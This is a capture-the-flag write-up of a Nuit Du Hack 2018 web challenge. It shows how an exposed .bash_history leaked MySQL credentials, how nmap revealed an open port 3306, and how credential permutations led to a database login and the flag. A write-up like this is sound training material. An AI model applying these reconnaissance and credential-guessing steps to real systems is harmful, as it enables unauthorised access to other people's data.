# Very personal portefolio

**"Very personal portefolio"** was a 100-point Web challenge at **Nuit Du Hack 2018**. 

## Challenge description

Because we can't access the platform anymore, this challenge shall remain without description for now.
> Note: this writeup will most likely be updated with more details once the platform is online again.


We are provided with a [url to a website](http://verypersonalportefolio.wargame.rocks).
Since the platform has been taken down for now, this writeup will try to be as accurate as possible, but may lack some visual material.

## Discovery

The page opens to a static HTML page using exactly [this template](https://www.themezy.com/free-website-templates/54-prologue-portfolio-free-responsive-template) I believe. When looking at the source, we can observe a commented line that contains the URL `http://verypersonalportefolio.wargame.rocks/~francois/<somethingaboutimages>`.

By searching for interesting files in the **~francois** directory, we figure out that the folder is most likely a symlink to a home folder by stumbling upon a **.bashrc** file (*with is very uninteresting*) and a **.bash_history** file (*which is very interesting*).

## Analyzing .bash_history

The file contains a lot of different commands, some of them creating or opening files, but most of them do not work. At the end of the file are some lines where it seems that François (*the likely name of the user*) is trying to connect to a **MySQL database**, that look like that:

```
mysql --user ierg457srg76fgyg --password francois verypersonalportefolio.wargame.rocks
mysql -user francois -password aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1kUXc0dzlXZ1hjUQ verypersonalportefolio.wargame.rocks
mysql -user aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1kUXc0dzlXZ1hjUQ -password francois verypersonalportefolio.wargame.rocks
...
```

So, it seems like François is not quite sure how to connect to his MySQL database. First things first, we run `nmap` on the target:

```bash
~$ nmap verypersonalportefolio.wargame.rocks
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-30 22:35 CEST
Nmap scan report for verypersonalportefolio.wargame.rocks (192.168.165.14)
Host is up (0.01s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
80/tcp   open  http
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 0.7 seconds
```

**Bingpot!** We can access MySQL from outside the server.

## Connecting to the database

Now, all that's left is to figure out how to connect to the database (*i.e. what are the right credentials?*). We try all the possible permutations

```
ierg457srg76fgyg / francois
ierg457srg76fgyg / aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g
francois / ierg457srg76fgyg
francois / aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g
aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g / ierg457srg76fgyg
aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g / francois
```

but nothing seems to work… until we figure out that François is so bad at sending commands, that he sometimes writes `-password` instead of `--password`, which is like passing the password **assword** to the command.

With this in mind, we try some more and figure out the correct credentials:

```bash
~$ mysql --user ierg457srg76fgyg -password -h verypersonalportefolio.wargame.rocks
```

Now that we're connected to the database, it's just a matter of retrieving the flag:

```bash
mysql> show databases;
+-----------
| Database |
+-----------
| NDH_2018 |
+----------+
1 row in set (0.00 sec)
mysql> use NDH_2018;
mysql> show tables;
+--------------------+
| Tables_in_NDH_2018 |
+--------------------+
| NDH                |
+--------------------+
1 row in set (0.00 sec)
> select * from NDH;
# And here we get some flag: ndh16_thisisarandomflagidonthavetherightone
```

And **flagged**!

**Flag: ndh16_thisisarandomflagidonthavetherightone**

## Wrapping up

There was nothing too impressive about this challenge, but it reminds us that we have to be painfully detail-oriented when analyzing a **luser**'s command history! Overall, it was a fun warm up!